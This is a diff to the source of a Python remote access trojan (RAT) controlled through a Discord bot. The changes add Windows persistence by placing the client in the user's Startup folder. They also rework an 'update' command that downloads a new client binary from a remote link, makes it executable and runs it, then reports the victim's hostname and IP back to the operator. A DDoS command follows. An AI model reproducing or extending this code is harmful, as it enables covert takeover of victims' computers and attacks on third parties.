@@ -18,6 +18,8 @@ hostname = socket.gethostname()
 if platform.system() == 'Linux':
     os.chdir("/tmp")
 else:
+    appdata = os.getenv("AppData")
+    startup = f"{appdata}\Microsoft\Windows\Start Menu\Programs\Startup"
     temp = os.getenv("temp")
     os.chdir(temp)
 
@@ -60,24 +62,33 @@ async def check(ctx):
 @bot.command()
 async def update(ctx, arg1):
     if platform.system() == 'Linux':
-        os.chdir("/startup")
-        if os.path.exists('Client'):
-            os.popen("rm Client")
+        os.chdir("/boot")
+        if os.path.exists("Client"):
+            os.remove("Client")
         
         r = requests.get(linux_link, allow_redirects=True)
         open("Client", 'wb').write(r.content)
         
-        os.popen("chmod 777 Client; ./Client")
-        await ctx.send(f"``[+] {hostname}@{ip}: RAT updated``")
-        sys.exit()
+        if os.path.exists("Client"):
+            os.popen("chmod 777 Client; ./Client")
+            await ctx.send(f"``[+] {hostname}@{ip}: RAT updated``")
+            sys.exit()
+        else:
+            os.chdir("/tmp")
     else:
-        
+        os.chdir(startup)
+        if os.path.exists("Client.exe"):
+            os.remove("Client.exe")
         
         r = requests.get(linux_link, allow_redirects=True)
-        open("Client", 'wb').write(r.content)
+        open("Client.exe", 'wb').write(r.content)
         
-        await ctx.send(f"``[+] {hostname}@{ip}: RAT updated``")
-        sys.exit()
+        if os.path.exists("Client.exe"):
+            os.popen("Client.exe")
+            await ctx.send(f"``[+] {hostname}@{ip}: RAT updated``")
+            sys.exit()
+        else:
+            os.chdir(temp)
     
 # ddos
 @bot.command()
